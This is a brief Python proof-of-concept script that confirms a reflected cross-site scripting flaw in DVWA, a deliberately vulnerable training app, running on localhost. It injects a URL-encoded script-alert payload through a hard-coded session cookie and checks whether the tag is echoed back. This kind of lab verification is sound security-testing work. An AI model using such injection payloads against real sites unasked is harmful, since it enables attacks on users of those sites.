#!/usr/bin/env python3
# DVWA Reflected XSS (low) verification PoC
import http.client

HOST = "127.0.0.1"
PORT = 4280
BASE = "/vulnerabilities/xss_r/"
COOKIE = "PHPSESSID=0a0c64bf2eec8072a8f897ac3ed7752c; security=low"

def fetch(name_param):
    conn = http.client.HTTPConnection(HOST, PORT)
    conn.request("GET", BASE + "?name=" + name_param, headers={"Cookie": COOKIE})
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, body

print("=== Normal input ===")
status, body = fetch("Alice")
start = body.find("<pre>") + 5
end = body.find("</pre>", start)
print("HTTP", status, "| echo:", body[start:end] if end > start else "<not found>")

print()
print("=== Attack input ===")
payload = "%3Cscript%3Ealert(%27XSS-PoC%27)%3C%2Fscript%3E"
status, body = fetch(payload)
start = body.find("<pre>") + 5
end = body.find("</pre>", start)
print("HTTP", status, "| echo:", body[start:end] if end > start else "<not found>")
print("Contains <script>: ", "<script>" in body)
print("=> Browser will execute alert('XSS-PoC') for the attack input, not for normal input.")